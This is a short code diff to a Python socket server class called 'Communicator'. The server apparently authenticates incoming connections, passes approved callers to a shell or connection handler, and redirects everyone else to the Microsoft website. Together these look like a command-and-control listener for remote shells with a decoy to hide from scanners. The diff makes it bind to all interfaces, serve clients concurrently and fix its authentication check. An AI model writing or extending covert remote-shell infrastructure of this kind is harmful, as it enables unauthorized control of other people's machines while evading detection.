@@ -5,7 +5,7 @@ from Handler import Handler
 
 
 class Communicator:
-    def __init__(self, host='127.0.0.1', port=80):
+    def __init__(self, host='', port=80):
         """
         Constructor of Communicator
         :param host: ip address of server (default- Loopback)
@@ -24,8 +24,7 @@ class Communicator:
         while True:
             self.__sock.listen()
             client, addr = self.__sock.accept()
-            #threading.Thread(target=self.__handle_new_client, args=(client, addr)).start()
-            self.__handle_new_client(client, addr)
+            threading.Thread(target=self.__handle_new_client, args=(client, addr)).start()
 
     @staticmethod
     def read_whole_socket(sock):
@@ -56,9 +55,9 @@ class Communicator:
         data = self.read_whole_socket(client_sock)
         request = HttpRequest.parse_http_request(data)
         if request:
-            if not HttpRequest.authentication_source(request):
+            if HttpRequest.authentication_source(request):
                 print("[+] Authentication succeed ->", addr)
-                Handler.handle_shell_connection(client_sock, addr)
+                Handler.handle_approved_source(client_sock, addr, request)
             else:
-                print("[-] Authentication failed ->", addr, "- redirect to HTML page")
+                print("[-] Authentication failed ->", addr, "- redirect to Microsoft website")
                 Handler.handle_unknown_source(client_sock)
